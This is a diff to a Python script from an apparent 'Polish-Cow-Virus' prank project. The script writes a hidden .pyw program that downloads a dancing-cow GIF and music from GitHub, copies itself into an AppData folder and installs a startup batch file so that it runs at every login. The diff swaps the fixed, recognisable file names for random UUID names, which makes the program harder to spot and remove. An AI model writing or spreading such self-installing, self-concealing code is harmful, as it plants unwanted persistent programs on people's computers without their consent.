@@ -2,10 +2,16 @@ import os
 import subprocess
 import sys
 import shutil
+import uuid
 import random
 
+gif_id = uuid.uuid4().hex
+mp3_id = uuid.uuid4().hex
+cow_id = uuid.uuid4().hex
+bat_id = uuid.uuid4().hex
+
 folder = os.path.dirname(os.path.abspath(__file__))
-cow_path = os.path.join(folder, "safewindowsapplication.pyw")
+cow_path = os.path.join(folder, f"{cow_id}.pyw")
 
 cow_code = r'''
 import tkinter as tk
@@ -17,12 +23,11 @@ import urllib.request
 
 folder = os.path.dirname(os.path.abspath(__file__))
 
-gif_path = os.path.join(folder, "processingsystems.gif")
-mp3_path = os.path.join(folder, "audiosystems.mp3")
+gif_path = os.path.join(folder, "{gif_id}.gif")
+mp3_path = os.path.join(folder, "{mp3_id}.mp3")
 
 gif_url = "https://github.com/eggman1243/Polish-Cow-Virus/raw/refs/heads/main/dancing.gif"
 mp3_url = "https://github.com/eggman1243/Polish-Cow-Virus/raw/refs/heads/main/pol.mp3"
-
 
 def download_file(url, path):
     if not os.path.exists(path):
@@ -168,6 +173,8 @@ root.after(100, init)
 root.mainloop()
 '''
 
+cow_code = cow_code.replace("{gif_id}", gif_id)
+cow_code = cow_code.replace("{mp3_id}", mp3_id)
 
 if not os.path.exists(cow_path):
     with open(cow_path, "w", encoding="utf-8") as f:
@@ -190,7 +197,7 @@ if existing_folders:
 
     local_cow = os.path.join(
         target_folder,
-        "safewindowsapplication.pyw"
+        f"{cow_id}.pyw"
     )
 
     shutil.copy(cow_path, local_cow)
@@ -202,13 +209,13 @@ if existing_folders:
 
     bat_path = os.path.join(
         startup_folder,
-        "critical_startup.bat"
+        f"{bat_id}.bat"
     )
 
     with open(bat_path, "w") as f:
         f.write(f'@echo off\n"{sys.executable}" "{local_cow}"')
 
-    print("safewindowsapplication.pyw added to startup!")
+    print("its cow time")
 else:
     print("No AppData Local folders found!")
 
